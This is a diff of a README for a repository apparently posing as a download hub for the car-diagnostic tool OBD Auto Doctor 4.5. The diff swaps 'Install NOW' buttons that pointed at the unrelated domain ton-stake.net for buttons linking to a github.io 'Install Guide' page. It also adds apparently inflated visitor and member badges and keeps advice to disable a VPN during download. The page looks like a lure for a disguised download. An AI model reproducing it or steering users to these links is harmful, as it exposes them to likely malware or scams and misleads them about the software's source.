@@ -1,12 +1,14 @@
 # 🚗 OBD Auto Doctor 4.5 Diagnostic Hub  
+![Visitors: 65K+](https://img.shields.io/badge/Visitors-65K+-blue) ![Members: 42K+](https://img.shields.io/badge/Members-42K+-green) ![Established: 2025](https://img.shields.io/badge/Established-2025-orange)
 
 ![OBD Auto Doctor 4.5 Banner](https://cdn6.aptoide.com/imgs/a/7/7/a7783a7279e01fd713654b181a51942a_fgraphic.png)  
  
 🌟 Unlock the power of vehicle diagnostics with **OBD Auto Doctor 4.5** in 2025! This repository is your go-to source for tutorials, resources, and tips to explore OBD Auto Doctor’s tools for diagnosing and monitoring your car’s performance. Get started with accessible diagnostic resources and join our community of mechanics and car enthusiasts today!  
 
-[![Install OBD Auto Doctor](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
 
----
+<a href="https://obd-autodoctor.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 📋 Installation Guide  
 
@@ -32,8 +34,9 @@ Follow these simple steps to set up OBD Auto Doctor 4.5 and start diagnosing you
    - Disable your VPN, as it may interfere with the download.  
    - Switch to a different browser (e.g., Chrome, Firefox, or Edge).  
 
-[![Install OBD Auto Doctor](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
----
+<a href="https://obd-autodoctor.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 💡 Why Choose OBD Auto Doctor 4.5  
 
